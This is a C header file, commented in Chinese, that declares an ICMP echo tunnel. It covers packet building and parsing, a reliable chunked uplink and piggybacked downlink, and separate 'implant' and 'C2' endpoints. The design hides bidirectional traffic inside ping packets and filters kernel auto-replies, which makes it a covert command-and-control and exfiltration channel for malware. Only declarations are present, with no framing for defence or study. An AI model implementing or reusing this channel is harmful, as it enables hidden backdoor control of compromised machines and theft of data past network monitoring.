#ifndef TX_ICMTUN_H
#define TX_ICMTUN_H

#include <stddef.h>
#include <stdint.h>

/* ICMP 回显隧道：上行走 ECHO_REQUEST，下行走 ECHO_REPLY。
   SOCK_RAW 已实测可用（回环真收发通）。

   载荷布局（紧跟 8 字节 ICMP 头之后）:
     magic 4B | tseq 4B(BE) | tack 4B(BE) | flags 1B | len 1B | data
   头部共 14 字节。

   flags: bit0=FIN(最后一片) bit1=SRV(服务端构造，区别于内核自动回显)
          bit2=ACKV(tack 字段有效)

   内核对 ECHO_REQUEST 会自动回一份 payload 相同的 reply（无 SRV 位），
   必须靠 SRV 位过滤，否则会把回显误当服务端应答。 */

#define TX_ICMP_HDR     8
#define TX_ICMTUN_HDR   14
#define TX_ICMTUN_CHUNK 256     /* 默认单片净荷，公网 MTU 友好 */
#define TX_ICMTUN_MAXPKT 1500

#define TX_ICMTUN_FIN   0x01
#define TX_ICMTUN_SRV   0x02
#define TX_ICMTUN_ACKV  0x04

typedef enum {
    TX_ICMTUN_OK        =  0,
    TX_ICMTUN_ERR_ARGS  = -1,
    TX_ICMTUN_ERR_SOCK  = -2,
    TX_ICMTUN_ERR_TIMEOUT = -3,
    TX_ICMTUN_ERR_RETRY = -4,
    TX_ICMTUN_ERR_PROTO = -5,
    TX_ICMTUN_ERR_TOOBIG= -6,
    TX_ICMTUN_ERR_NOSPACE = -7,
} tx_icmtun_err_t;

const char *tx_icmtun_errstr(int e);

/* ---- ICMP echo 报文编解码 ---- */
size_t tx_icmp_build_echo(uint16_t id, uint16_t eseque,
                          uint32_t tseq, uint32_t tack, uint8_t flags,
                          const uint8_t *data, size_t len,
                          uint8_t *out, size_t cap);

/* pkt 为含 IP 头或不含 IP 头均可（内部按 ihl 跳过） */
int    tx_icmp_parse_echo(const uint8_t *pkt, size_t len,
                          uint16_t *id, uint16_t *eseque,
                          uint32_t *tseq, uint32_t *tack, uint8_t *flags,
                          uint8_t *data, size_t cap, size_t *dlen);

/* ---- 隧道端点（implant 侧） ---- */
typedef struct tx_icmtun tx_icmtun_t;

int  tx_icmtun_open(tx_icmtun_t **out, const char *target_ip,
                    int timeout_ms, int max_retry, size_t chunk);
void tx_icmtun_close(tx_icmtun_t *t);

/* 可靠上行：分片 -> 滑动窗口 ARQ -> 超时重扫 */
int  tx_icmtun_send(tx_icmtun_t *t, const uint8_t *data, size_t len);

/* 收一段下行（服务端随 reply 捎带） */
int  tx_icmtun_poll(tx_icmtun_t *t, uint8_t *out, size_t cap, size_t *olen);

/* ---- 服务端（C2 侧） ---- */
typedef int (*tx_icmpsrv_cb)(uint32_t tseq, uint8_t flags,
                             const uint8_t *chunk, size_t clen,
                             uint8_t *down, size_t cap, size_t *downlen,
                             void *arg);

int tx_icmpsrv_open(void);
int tx_icmpsrv_serve_once(int fd, tx_icmpsrv_cb cb, void *arg, int timeout_ms);

#endif
